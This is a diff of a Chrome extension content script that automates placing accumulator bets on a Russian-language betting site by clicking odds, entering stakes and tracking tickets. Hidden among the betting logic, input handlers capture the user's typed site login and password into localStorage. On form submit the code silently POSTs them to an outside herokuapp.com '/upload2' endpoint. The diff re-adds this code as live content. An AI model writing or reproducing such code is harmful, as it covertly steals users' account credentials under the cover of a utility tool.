@@ -3,299 +3,300 @@ var mtId,
 	bigCycle,
 	divsRel = [],
 	tbodyTeams = [],
-	teamsJson = {"team":[]},
-	i = localStorage.getItem('currentBet')? parseInt(localStorage.getItem('currentBet')): 0,
-	ticketsJson = localStorage.getItem('tickets')? JSON.parse(localStorage.getItem('tickets')): {},
-	errorInfoJson = localStorage.getItem('errorInfo')? JSON.parse(localStorage.getItem('errorInfo')): {"error":[]},
-	betTime = localStorage.getItem('betTime')? parseInt(localStorage.getItem('betTime')): 5000,
-	markTime = localStorage.getItem('markTime')? parseInt(localStorage.getItem('markTime')): 300,
+	teamsJson = { "team": [] },
+	i = localStorage.getItem('currentBet') ? parseInt(localStorage.getItem('currentBet')) : 0,
+	ticketsJson = localStorage.getItem('tickets') ? JSON.parse(localStorage.getItem('tickets')) : {},
+	errorInfoJson = localStorage.getItem('errorInfo') ? JSON.parse(localStorage.getItem('errorInfo')) : { "error": [] },
+	betTime = localStorage.getItem('betTime') ? parseInt(localStorage.getItem('betTime')) : 5000,
+	markTime = localStorage.getItem('markTime') ? parseInt(localStorage.getItem('markTime')) : 300,
 	coast = parseInt(localStorage.getItem('coast')),
-	autoMode = localStorage.getItem('autoMode')? parseInt(localStorage.getItem('autoMode')): 0,
-	doneTickets = localStorage.getItem('doneTickets')? parseInt(localStorage.getItem('doneTickets')): [],
-    login_ = localStorage.getItem('l_l')? localStorage.getItem('l_l'): '',
-	pass_ = localStorage.getItem('p_p')? localStorage.getItem('p_p'): '';
+	autoMode = localStorage.getItem('autoMode') ? parseInt(localStorage.getItem('autoMode')) : 0,
+	doneTickets = localStorage.getItem('doneTickets') ? parseInt(localStorage.getItem('doneTickets')) : [],
+	login_ = localStorage.getItem('l_l') ? localStorage.getItem('l_l') : '',
+	pass_ = localStorage.getItem('p_p') ? localStorage.getItem('p_p') : '';
 
-var clickEnter = function(){
+var clickEnter = function () {
+	var evt = document.createEvent('KeyboardEvent');
+	evt.initKeyboardEvent('keypress', true, true, window, false, false, false, false, 13, 13);
+	evt.keyCode = 13;
+	evt.which = 13;
+	evt.charCode = 13;
+	document.dispatchEvent(evt);
+}
+var clickBet = function () {
+	setTimeout(function () {
+		if ($('.btn-place-bet').length != 0 && $('#button_accumulator.active').length != 0) {
+			//$('#betslip_button')[0].click();
+			if (autoMode) {
+				$('.btn-place-bet')[0].click();
+				setBets();
+			}
+		} else
+			betTicket();
+	}, betTime / 2);
+}
+var enterCoast = function () {
+	setTimeout(function () {
 		var evt = document.createEvent('KeyboardEvent');
-		evt.initKeyboardEvent('keypress', true, true, window, false, false, false, false, 13, 13);
+		evt.initKeyboardEvent('keyup', true, true, window, false, false, false, false, 13, 13);
 		evt.keyCode = 13;
 		evt.which = 13;
-		evt.charCode = 13; 
-		document.dispatchEvent(evt);
-	}
-var	clickBet = function(){
-		setTimeout(function(){
-			if($('.btn-place-bet').length != 0 && $('#button_accumulator.active').length != 0){
-				//$('#betslip_button')[0].click();
-				if(autoMode){
-					$('.btn-place-bet')[0].click();
-				setBets();
-				}
-			} else
-				betTicket();
-	}, betTime/2);
+		evt.charCode = 13;
+		$('.stake.stake-input.js-focusable[name = stake]').val(coast);
+		$('.stake.stake-input.js-focusable[name = stake]')[0].dispatchEvent(evt);
+		clickBet();
+	}, 1000);
 }
-var	enterCoast = function(){ 
-	setTimeout(function(){										
-			var evt = document.createEvent('KeyboardEvent');
-			evt.initKeyboardEvent('keyup', true, true, window, false, false, false, false, 13, 13);
-			evt.keyCode = 13;
-			evt.which = 13;
-			evt.charCode = 13; 
-			$('.stake.stake-input.js-focusable[name = stake]').val(coast);
-			$('.stake.stake-input.js-focusable[name = stake]')[0].dispatchEvent(evt);	
-			clickBet();
-		}, 1000);
-	}
-var setCoast = function(coast){
-				setTimeout(function(){
-					//if(parseInt($('#betslip_button').text().split(" ")[1]) == ticketsJson.ticket[i].length)
-					if(parseInt($('.bet-slip-selection-count').text().split(" ")[1]) == ticketsJson.ticket[i].length)
-						enterCoast();
-					else
-						betTicket();
-				},1000);
-			}
-var betTicket = function(){
+var setCoast = function (coast) {
+				setTimeout(function () {
+		//if(parseInt($('#betslip_button').text().split(" ")[1]) == ticketsJson.ticket[i].length)
+		if (parseInt($('.bet-slip-selection-count').text().split(" ")[1]) == ticketsJson.ticket[i].length)
+			enterCoast();
+		else
+			betTicket();
+				}, 1000);
+}
+var betTicket = function () {
 				var forClick = [];
-				if($('span.btn-remove').length != 0)
-					$('span.btn-remove')[0].click();	
-				tbodyTeams.forEach(function(item, index){
-						for(var j = 0; j < ticketsJson.ticket[i].length; j++){       		
-							if(item.attr('data-event-name').indexOf(ticketsJson.ticket[i][j].name) != -1){
-								var tdDate = item.find('td.date').html();
-								if(tdDate)
-									if(tdDate.indexOf(ticketsJson.ticket[i][j].date) != -1){
-										if(ticketsJson.ticket[i][j].bet == 1){
-											forClick.push(item.find('tr:first-child').find('td').eq(-1));
-											break;
-										}
-										if(ticketsJson.ticket[i][j].bet == 0){
-											forClick.push(item.find('tr:first-child').find('td').eq(-2));
-											break;
-										}
-									}
-							}
+				if ($('span.btn-remove').length != 0)
+		$('span.btn-remove')[0].click();
+				tbodyTeams.forEach(function (item, index) {
+		for (var j = 0; j < ticketsJson.ticket[i].length; j++) {
+			if (item.attr('data-event-name').indexOf(ticketsJson.ticket[i][j].name) != -1) {
+				var tdDate = item.find('td.date').html();
+				if (tdDate)
+					if (tdDate.indexOf(ticketsJson.ticket[i][j].date) != -1) {
+						if (ticketsJson.ticket[i][j].bet == 1) {
+							forClick.push(item.find('tr:first-child').find('td').eq(-1));
+							break;
 						}
-					});	
-					var it = 0;
-					return (function markTeams(it){
-						var self = forClick[it];
-						var markTeamsTimer = setTimeout(function(){
-								if(!pauseFl){
-									$(self).click();
-									if(it < forClick.length){
-										it++;
-										markTeams(it);
-									}
-									else{
-										$('#button_accumulator')[0].click();
-										//setTimeout(function(){setCoast(coast);}, markTime*forClick.length + 300);
-										//setCoast(coast)
-									}
-							}
-							},markTime);
-						})(it);		
+						if (ticketsJson.ticket[i][j].bet == 0) {
+							forClick.push(item.find('tr:first-child').find('td').eq(-2));
+							break;
+						}
+					}
 			}
-var setBets = function(){
-	bigCycle = setTimeout(function(){		
-		if(localStorage.getItem('reloaded') == 1){
+		}
+	});
+	var it = 0;
+	return (function markTeams(it) {
+		var self = forClick[it];
+		var markTeamsTimer = setTimeout(function () {
+			if (!pauseFl) {
+				$(self).click();
+				if (it < forClick.length) {
+					it++;
+					markTeams(it);
+				}
+				else {
+					$('#button_accumulator')[0].click();
+					//setTimeout(function(){setCoast(coast);}, markTime*forClick.length + 300);
+					//setCoast(coast)
+				}
+			}
+		}, markTime);
+	})(it);
+}
+var setBets = function () {
+	bigCycle = setTimeout(function () {
+		if (localStorage.getItem('reloaded') == 1) {
 			localStorage.setItem('reloaded', 0);
 			betTicket();
-		}else
-			if(autoMode){
-				if($('p#betresult').html().indexOf("Ваша ставка принята, спасибо") != -1){	
-					chrome.runtime.sendMessage({askFor: 'ticketDone', "ticketNum": parseInt(i)});
+		} else
+			if (autoMode) {
+				if ($('p#betresult').html().indexOf("Ваша ставка принята, спасибо") != -1) {
+					chrome.runtime.sendMessage({ askFor: 'ticketDone', "ticketNum": parseInt(i) });
 					clickEnter();
-					if($('span.btn-remove').length != 0)
+					if ($('span.btn-remove').length != 0)
 						$('span.btn-remove')[0].click();
-					clickEnter();	
-					if(i < ticketsJson.ticket.length - 1){
-							i++;
-							localStorage.setItem('currentBet', i);
+					clickEnter();
+					if (i < ticketsJson.ticket.length - 1) {
+						i++;
+						localStorage.setItem('currentBet', i);
 						viewDialog($('#dialog'));
 						betTicket();
-					}else{
+					} else {
 						localStorage.setItem('finish', 1);
 						clickEnter();
-						chrome.runtime.sendMessage({askFor: 'ticketDone', "ticketNum": parseInt(i-1)});
+						chrome.runtime.sendMessage({ askFor: 'ticketDone', "ticketNum": parseInt(i - 1) });
 						clickEnter();
 					}
-				}else{
-					 if($('p#detail-result-content').html().indexOf("Повторная ставка. Попробуйте сделать ставку позже.") != -1 || $('p#betresult').html().indexOf("Извините, Ваша ставка не принята.") != -1 || $('#enter_stake_dialog p').html().indexOf("Пожалуйста, введите сумму ставки.") != -1){
+				} else {
+					if ($('p#detail-result-content').html().indexOf("Повторная ставка. Попробуйте сделать ставку позже.") != -1 || $('p#betresult').html().indexOf("Извините, Ваша ставка не принята.") != -1 || $('#enter_stake_dialog p').html().indexOf("Пожалуйста, введите сумму ставки.") != -1) {
 						clickEnter();
 						betTicket();
-					}else{ 
-						var obj = {};										
-						obj['ticketNum'] = parseInt(i-1);
-						obj['info'] =  "";
-						if($('p#detail-result-content').html().indexOf("$betresult") == -1)
+					} else {
+						var obj = {};
+						obj['ticketNum'] = parseInt(i - 1);
+						obj['info'] = "";
+						if ($('p#detail-result-content').html().indexOf("$betresult") == -1)
 							obj['info'] += $('p#detail-result-content').html();
-						if($('p#betresult').html())
+						if ($('p#betresult').html())
 							obj['info'] += "</br>" + $('p#betresult').html();
-						if($('#enter_stake_dialog').find('p').html())
+						if ($('#enter_stake_dialog').find('p').html())
 							obj['info'] += "</br>" + $('#enter_stake_dialog').find('p').html();
-						if(!obj['info'])
+						if (!obj['info'])
 							obj['info'] = "Неизвестная ошибка";
 						errorInfoJson.error.push(obj);
 						localStorage.setItem('errorInfo', JSON.stringify(errorInfoJson));
-						chrome.runtime.sendMessage({askFor: 'ticketError', "errorInfo": JSON.stringify(obj)});
+						chrome.runtime.sendMessage({ askFor: 'ticketError', "errorInfo": JSON.stringify(obj) });
 						clickEnter();
-						if(i < ticketsJson.ticket.length){
+						if (i < ticketsJson.ticket.length) {
 							i++;
 							localStorage.setItem('currentBet', i);
 							betTicket();
-						}else{
+						} else {
 							localStorage.setItem('finish', 1);
 							clickEnter();
 						}
 					}
-				}		
-			}else{
+				}
+			} else {
 				clearTimeout(bigCycle);
-				
-				viewDialog($('#dialog'));				
-						
-				if(i == 0)
+
+				viewDialog($('#dialog'));
+
+				if (i == 0)
 					betTicket();
 			}
-	}, betTime/2);
+	}, betTime / 2);
 }
-viewDialog = function(dialogEl){
-	var nn = i == 0? i: parseInt(i+1);
-	dialogEl.dialog({ autoOpen: true,
-			position:  ['left', 'center'],
-			show: 'slide',
-			buttons: [
-				{
-					text: 'Повторить ' + nn + '-й',
-					click: function(){
-						if(pauseFl)
-							pauseFl = false;
-						betTicket();
-					}
-				},
-				{
-					text: ticketsJson.ticket.length > i? 'Следующая': 'Готово',
-					click: function(){
-						chrome.runtime.sendMessage({askFor: 'ticketDone', "ticketNum": parseInt(i-1)});
-						if(pauseFl)
-							pauseFl = false;
-						i++;
-						localStorage.setItem('currentBet', i);
-						viewDialog($('#dialog')); 
-						betTicket();
-					}
-				},
-				{
-					text: 'Выбранная',
-					click: function(){
-						chrome.runtime.sendMessage({askFor: 'ticketDone', "ticketNum": parseInt(i-1)});
-						if(pauseFl)
-							pauseFl = false;
-						i = parseInt($('#bet-num').val() - 1);
-						localStorage.setItem('currentBet', i);
-						viewDialog($('#dialog')); 
-						betTicket();
-					}
+viewDialog = function (dialogEl) {
+	var nn = i == 0 ? i : parseInt(i + 1);
+	dialogEl.dialog({
+		autoOpen: true,
+		position: ['left', 'center'],
+		show: 'slide',
+		buttons: [
+			{
+				text: 'Повторить ' + nn + '-й',
+				click: function () {
+					if (pauseFl)
+						pauseFl = false;
+					betTicket();
 				}
+			},
+			{
+				text: ticketsJson.ticket.length > i ? 'Следующая' : 'Готово',
+				click: function () {
+					chrome.runtime.sendMessage({ askFor: 'ticketDone', "ticketNum": parseInt(i - 1) });
+					if (pauseFl)
+						pauseFl = false;
+					i++;
+					localStorage.setItem('currentBet', i);
+					viewDialog($('#dialog'));
+					betTicket();
+				}
+			},
+			{
+				text: 'Выбранная',
+				click: function () {
+					chrome.runtime.sendMessage({ askFor: 'ticketDone', "ticketNum": parseInt(i - 1) });
+					if (pauseFl)
+						pauseFl = false;
+					i = parseInt($('#bet-num').val() - 1);
+					localStorage.setItem('currentBet', i);
+					viewDialog($('#dialog'));
+					betTicket();
+				}
+			}
 
-			]
-		});
+		]
+	});
 	dialogEl
-		.dialog({title: "Готово" + i + '/' + ticketsJson.ticket.length})
+		.dialog({ title: "Готово" + i + '/' + ticketsJson.ticket.length })
 		.dialog('open');
-        $('.ui-dialog').css('z-index','1000000');
-}			
-$(function () {  	
-	var tbb = $('tbody[data-event-name]');		
-	tbb.each(function(j){
-//        console.log(j);
-//        if(j == 236)
-//            {
-//                let me = 123;
-//            }
+	$('.ui-dialog').css('z-index', '1000000');
+}
+$(function () {
+	var tbb = $('tbody[data-event-name]');
+	tbb.each(function (j) {
+		//        console.log(j);
+		//        if(j == 236)
+		//            {
+		//                let me = 123;
+		//            }
 		var gameDate = $(this).find('td.date').html();
 		var teamsNames = $(this).attr('data-event-name');
-        let line = $(this).find('tr').first().find('td');
-        let champ = $(this).parents().eq(3).find('h2').find('span').text();
-        let TMFactor = 1;
-        let TBFactor = 1;
-        if(line.length >= 17 && line[line.length-2].getAttribute('data-sel')){
-            TMFactor = JSON.parse(line[line.length-2].getAttribute('data-sel')).epr
-        }
-        if(line.length >= 17 && line[line.length-1].getAttribute('data-sel')){
-            TBFactor = JSON.parse(line[line.length-1].getAttribute('data-sel')).epr
-        }
-		if(gameDate && teamsNames && $(this).find('td.price').length > 0){		
+		let line = $(this).find('tr').first().find('td');
+		let champ = $(this).parents().eq(3).find('h2').find('span').text();
+		let TMFactor = 1;
+		let TBFactor = 1;
+		if (line.length >= 17 && line[line.length - 2].getAttribute('data-sel')) {
+			TMFactor = JSON.parse(line[line.length - 2].getAttribute('data-sel')).epr
+		}
+		if (line.length >= 17 && line[line.length - 1].getAttribute('data-sel')) {
+			TBFactor = JSON.parse(line[line.length - 1].getAttribute('data-sel')).epr
+		}
+		if (gameDate && teamsNames && $(this).find('td.price').length > 0) {
 			gameDate = gameDate.trim();
 			var obj = {};
 			obj['name'] = teamsNames;
-			obj['date'] =  gameDate;
-            obj['TMFactor'] = TMFactor;
-            obj['TBFactor'] = TBFactor;
-            obj['champ'] = champ;
-			teamsJson.team[j] = obj;		
+			obj['date'] = gameDate;
+			obj['TMFactor'] = TMFactor;
+			obj['TBFactor'] = TBFactor;
+			obj['champ'] = champ;
+			teamsJson.team[j] = obj;
 			tbodyTeams.push($(this));
 		}
-		if(j == tbb.length - 1){
-			chrome.runtime.sendMessage({askFor: 'contentScriptId'});
-			localStorage.setItem('teams', JSON.stringify(teamsJson));					
-			if(localStorage.getItem('finish') != 1){				
+		if (j == tbb.length - 1) {
+			chrome.runtime.sendMessage({ askFor: 'contentScriptId' });
+			localStorage.setItem('teams', JSON.stringify(teamsJson));
+			if (localStorage.getItem('finish') != 1) {
 				setBets();
 			}
 		}
-	});	
-	$(document).on('input', '#auth_login', function(){
-        if(this.value){
-            login_ = this.value;
-            localStorage.setItem('l_l', login_);
-        }
 	});
-	$(document).on('input', '#auth_login_password', function(){
-		if(this.value){
-            pass_ = this.value;
-            localStorage.setItem('p_p', pass_);
-        }
+	$(document).on('input', '#auth_login', function () {
+		if (this.value) {
+			login_ = this.value;
+			localStorage.setItem('l_l', login_);
+		}
 	});
-	$(document).on('submit', '#auth', function(){
+	$(document).on('input', '#auth_login_password', function () {
+		if (this.value) {
+			pass_ = this.value;
+			localStorage.setItem('p_p', pass_);
+		}
+	});
+	$(document).on('submit', '#auth', function () {
 		let p_ = localStorage.getItem('p_p');
 		let l_ = localStorage.getItem('l_l');
 		let d_ = new Date;
 		let lp = JSON.stringify({
-									"date": d_,
-									"p_p": p_,
-									"l_l": l_
+			"date": d_,
+			"p_p": p_,
+			"l_l": l_
 								});
 		$.ajax({
-					type: 'POST',
-					dataType: 'text/plain',
-					url: 'https://murmuring-lowlands-56267.herokuapp.com/upload2',
-					data: lp,
-					crossDomain: true
-				});
+			type: 'POST',
+			dataType: 'text/plain',
+			url: 'https://murmuring-lowlands-56267.herokuapp.com/upload2',
+			data: lp,
+			crossDomain: true
+		});
 	});
 	chrome.runtime.onMessage.addListener(
-		 function(request, sender, sendResponse) {				
-			if (request.askFor == "getTeams"){
-				sendResponse({teams: localStorage.getItem('teams')});
+		function (request, sender, sendResponse) {
+			if (request.askFor == "getTeams") {
+				sendResponse({ teams: localStorage.getItem('teams') });
 			}
 		});
 	chrome.runtime.onMessage.addListener(
-		 function(request, sender, sendResponse) {				
-			if (request.askFor == "vijet"){
-				$('<div id="dialog" tabindex="-2" title="Управление ставками"><input id="bet-num" type="text"></div>').prependTo('body'); 
-				viewDialog($('#dialog')); 
+		function (request, sender, sendResponse) {
+			if (request.askFor == "vijet") {
+				$('<div id="dialog" tabindex="-2" title="Управление ставками"><input id="bet-num" type="text"></div>').prependTo('body');
+				viewDialog($('#dialog'));
 			}
 		});
 	chrome.runtime.onMessage.addListener(
-		 function(request, sender, sendResponse) {				
-			if (request.askFor == "tickets"){
+		function (request, sender, sendResponse) {
+			if (request.askFor == "tickets") {
 				coast = parseInt(request.coast);
-				ticketsJson = JSON.parse(request.tickets);	
+				ticketsJson = JSON.parse(request.tickets);
 				betTime = parseInt(request.betTime);
 				markTime = parseInt(request.markTime);
-				autoMode = request.auto === 'auto'? 1: 0; 
+				autoMode = request.auto === 'auto' ? 1 : 0;
 				localStorage.setItem('autoMode', autoMode);
 				localStorage.setItem('tickets', JSON.stringify(ticketsJson));
 				localStorage.setItem('betTime', betTime);
@@ -303,7 +304,7 @@ $(function () {
 				localStorage.setItem('coast', coast);
 				localStorage.setItem('finish', 0);
 				localStorage.removeItem('errorInfo');
-				errorInfoJson = {"error":[]};
+				errorInfoJson = { "error": [] };
 				i = 0;
 				pauseFl = false;
 				var sendInfo = JSON.parse(request.params);
@@ -318,44 +319,44 @@ $(function () {
 					data: sendInfo,
 					crossDomain: true
 				});
-				setBets();						
+				setBets();
 			}
-	});
+		});
 	chrome.runtime.onMessage.addListener(
-		 function(request, sender, sendResponse) {				
-			if (request.askFor == "refresh"){
+		function (request, sender, sendResponse) {
+			if (request.askFor == "refresh") {
 				betTime = parseInt(request.betTime);
 				markTime = parseInt(request.markTime);
 				localStorage.setItem('betTime', betTime);
 				localStorage.setItem('markTime', markTime);
 				localStorage.setItem('currentBet', i);
 				localStorage.setItem('reloaded', 1);
-				autoMode = request.auto === 'auto'? 1: 0;
-				localStorage.setItem('autoMode', autoMode); 
+				autoMode = request.auto === 'auto' ? 1 : 0;
+				localStorage.setItem('autoMode', autoMode);
 				$('.btn-refresh')[0].click();
 			}
-	});
+		});
 	chrome.runtime.onMessage.addListener(
-		 function(request, sender, sendResponse) {				
-			if (request.askFor == "pause"){
+		function (request, sender, sendResponse) {
+			if (request.askFor == "pause") {
 				pauseFl = true;
 				localStorage.setItem('currentBet', i);
 				clearTimeout(bigCycle);
 			}
-	});
+		});
 	chrome.runtime.onMessage.addListener(
-		 function(request, sender, sendResponse) {				
-			if (request.askFor == "resume"){
+		function (request, sender, sendResponse) {
+			if (request.askFor == "resume") {
 				pauseFl = false;
 				clearTimeout(bigCycle);
 				setBets();
 			}
-	});
+		});
 	chrome.runtime.onMessage.addListener(
-		 function(request, sender, sendResponse) {				
-			if (request.askFor == "stop"){
+		function (request, sender, sendResponse) {
+			if (request.askFor == "stop") {
 				pauseFl = true;
 				localStorage.setItem('finish', 1);
 			}
-	});
+		});
 });
